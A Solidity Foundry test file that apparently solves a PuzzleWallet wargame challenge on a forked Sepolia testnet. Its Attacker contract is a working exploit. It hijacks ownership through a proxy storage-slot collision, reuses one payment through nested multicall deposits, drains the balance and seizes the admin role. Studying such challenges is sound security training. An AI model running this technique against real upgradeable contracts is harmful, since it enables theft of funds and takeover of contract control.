// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface PuzzleWallet{
    function whitelisted(address addr) external view returns (bool);
    function maxBalance() external view returns (uint256);
    function proposeNewAdmin(address _newAdmin) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function init(uint256 _maxBalance)external;
    function admin() external view returns (address);
    function pendingAdmin() external view returns (address);
    function owner() external view returns (address);
    function addToWhitelist(address addr) external;
    function callme() external;
    function multicall(bytes[] calldata data) external payable;
    function balances(address addr) external view returns (uint256);
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function deposit() external payable;
}

contract Attacker {
    receive() payable external{
    }

    function attack(address walletAddress) public payable{
        PuzzleWallet wallet = PuzzleWallet(walletAddress);
        uint256 balance = uint256(uint160(address(msg.sender)));

        wallet.proposeNewAdmin(address(this)); // this changes the owner to th attacker, because of storage slot conflict

        wallet.addToWhitelist(address(this));

        uint currBalance = address(wallet).balance;

        require(wallet.whitelisted(address(this)), "PuzzleWalletTest: expect whitelisted");

        bytes[] memory data = new bytes[](3);
        bytes[] memory mcdata = new bytes[](1);
        data[0] = abi.encodeWithSignature("deposit()");  // multicall does not change msg.sender and msg.value
        mcdata[0] = abi.encodeWithSignature("deposit()"); // this allows us to use one msg.value to make multiple deposits
        data[1] = abi.encodeWithSignature("multicall(bytes[])", mcdata);
        data[2] = abi.encodeWithSignature("execute(address,uint256,bytes)", address(this), currBalance * 2, ""); // withdraw 2 * msg.value, this makes the wallet.balance to be 0
        wallet.multicall{value: currBalance}(data); // and finally allows us to call setMaxBalance to set the maxBalance to be the address of the attacker

        wallet.setMaxBalance(balance);
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract PuzzleWalletTest is Test {
    function setUp() public {
        vm.createSelectFork("sepolia", 5460812);
    }

    function test_wallet() public {
        PuzzleWallet wallet = PuzzleWallet(0x22792ea76bcc9AE03D5aA02B48D643e25930a6a9);
        Attacker attacker = new Attacker();
        attacker.attack{value: 0.002 ether}(0x22792ea76bcc9AE03D5aA02B48D643e25930a6a9);

        require(wallet.owner() == address(attacker), "PuzzleWalletTest: owner should be changed");
        require(wallet.admin() == address(this), "PuzzleWalletTest: admin hijack failed");
    }


}
